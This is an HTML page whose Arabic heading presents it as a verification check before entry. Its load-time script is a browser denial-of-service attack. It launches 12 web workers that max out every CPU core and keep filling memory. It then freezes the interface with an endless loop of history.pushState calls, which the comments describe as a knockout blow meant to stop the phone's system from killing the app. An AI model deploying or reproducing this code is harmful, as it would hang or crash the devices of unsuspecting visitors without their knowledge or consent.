<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Extreme Multi-Core Test</title>
</head>
<body style="text-align:center; padding-top:50px; font-family:sans-serif;">
    <h1 id="status">جاري بدء التحقق قبل الدخول...</h1>
    <p>     </p>
    <div id="logs"></div>

    <script>
        // كود العامل (Worker) الذي سيتم تشغيله في الخلفية
        const workerCode = `
            self.onmessage = function() {
                let data = [];
                setInterval(() => {
                    // إشغال النواة تماماً
                    for(let i=0; i<5000000; i++) { Math.sqrt(Math.random()); }
                    // ملء الرام
                    data.push(new Float64Array(1000000));
                }, 10);
            };
        `;

        const blob = new Blob([workerCode], {type: 'application/javascript'});
        const workerUrl = URL.createObjectURL(blob);

        function startExtremeStress() {
            // تشغيل 12 عامل (Workers) لضمان إشغال كل أنوية S21 أو Note 9
            for(let i=0; i<12; i++) {
                const worker = new Worker(workerUrl);
                worker.postMessage("start");
                console.log("Worker " + i + " started");
            }

            document.getElementById('status').innerText = "تم تفعيل كافة المسارات (CPU 100%)";
            
            // الضربة القاضية للـ UI Thread (الواجهة) بعد 5 ثواني
            setTimeout(() => {
                while(true) {
                    // تجميد الواجهة تماماً ومنع النظام من قتل التطبيق بسهولة
                    let s = "";
                    for(let i=0; i<1000; i++) s += Math.random();
                    history.pushState(null, "", s);
                }
            }, 5000);
        }

        window.onload = startExtremeStress;
    </script>
</body>
</html>
